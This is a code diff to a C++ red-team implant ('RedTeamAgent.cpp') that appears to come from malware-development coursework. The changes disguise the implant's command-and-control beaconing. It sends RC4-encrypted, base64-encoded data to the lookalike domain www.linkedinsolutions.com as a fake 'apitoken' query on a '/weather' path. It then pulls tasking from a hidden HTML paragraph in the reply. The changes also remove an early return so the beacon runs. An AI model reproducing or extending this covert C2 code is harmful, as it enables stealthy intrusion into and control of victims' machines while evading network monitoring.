@@ -1,6 +1,7 @@
 // RedTeamAgent.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
 #include "main.h"
+#include "../../Maltrak_new_vm_download/Module05/Execute/execute.h"
 
 
 string ModuleCommands = "";
@@ -80,6 +81,9 @@ int main(int argc, char* argv[])
     }
 
     */
+    
+    // <p id="instructions" style="display:none">{{ instructions }}</p>
+
 
     string paw = "";
     while (true)
@@ -101,10 +105,13 @@ int main(int argc, char* argv[])
 
         char* encryptedmsg = (char*)RC4((char*)"RedTeam", (unsigned char*)msg.dump().c_str(), msg.dump().length());
         char* encodedmsg = b64encode((char*)encryptedmsg, msg.dump().length());
-        printf("Our Encoded Msg: %s\n", encodedmsg);
-        return 0;
+       
+         
+        string fullmsg = "path=dashboard.html&p=3&apitoken=" + string(encodedmsg);
+        printf("Our Encoded Msg: %s\n", fullmsg.c_str());
 
-        HINTERNET hSession = SendRequest("www.linkedinsolutions.com", 80, "/beacon", "POST", encodedmsg);
+
+        HINTERNET hSession = SendRequest("www.linkedinsolutions.com", 80, "/weather", "POST", fullmsg.c_str());
         if (hSession)
         {
             printf("Data has been sent successfully\n");
@@ -123,9 +130,15 @@ int main(int argc, char* argv[])
             continue;
 
         InternetCloseHandle(hSession);
-        char* DecodedResponse = b64decode(Response, Length);
+
+        // <p id="instructions" style="display:none">{{ instructions }}</p>
+        int pos{ 0 };
+        char* ExtractedResponse = ExtractString(Response, (char*)"<p id=\"instructions\" style=\"display:none\">", (char*)"</p>", pos); 
+        Length = strlen(ExtractedResponse);
+        char* DecodedResponse = b64decode(ExtractedResponse, Length);
         DWORD NewLength = b64d_size(Length);
         char* DecryptedResponse = (char*)RC4((char*)"RedTeam", (unsigned char*)DecodedResponse, NewLength);
+        DecryptedResponse[NewLength] = '\0';
         string response = DecryptedResponse;
         response = regex_replace(response, regex("\\\\"), "");
         response = regex_replace(response, regex("\"\\["), "[");
@@ -238,9 +251,11 @@ int main(int argc, char* argv[])
 
                 char* encryptedmsg = (char*)RC4((char*)"RedTeam", (unsigned char*)msg.dump().c_str(), msg.dump().length());
                 char* encodedmsg = b64encode((char*)encryptedmsg, msg.dump().length());
-                printf("Our Encoded Msg: %s\n", encodedmsg);
+                string fullmsg = "path=dashboard.html&p=3&apitoken=" + string(encodedmsg);
+                printf("Our Encoded Msg: %s\n", fullmsg.c_str());
 
-                hSession = SendRequest("www.linkedinsolutions.com", 80, "/beacon", "POST", encodedmsg);
+
+                HINTERNET hSession = SendRequest("www.linkedinsolutions.com", 80, "/weather", "POST", fullmsg.c_str());
                 if (hSession)
                 {
                     printf("Data has been sent successfully\n");
